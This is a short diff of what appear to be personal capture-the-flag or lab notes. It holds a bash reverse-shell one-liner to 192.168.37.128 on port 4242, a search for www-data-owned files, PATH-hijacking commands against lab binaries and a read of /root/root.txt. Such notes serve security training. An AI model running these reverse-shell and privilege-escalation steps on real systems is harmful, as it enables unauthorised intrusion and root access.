@@ -61,6 +61,15 @@ bash -i >& /dev/tcp/192.168.37.128/4242 0>&1
 ${uh%%:*}
 
 shell running on 1234
+4242
 
 
 find / -user www-data 2>/dev/null | grep -v "proc"
+
+
+PATH=.:$PATH /usr/bin/ipash
+echo $(</root/root.txt)
+
+PATH=.:$PATH /lab/monitor_students
+
+
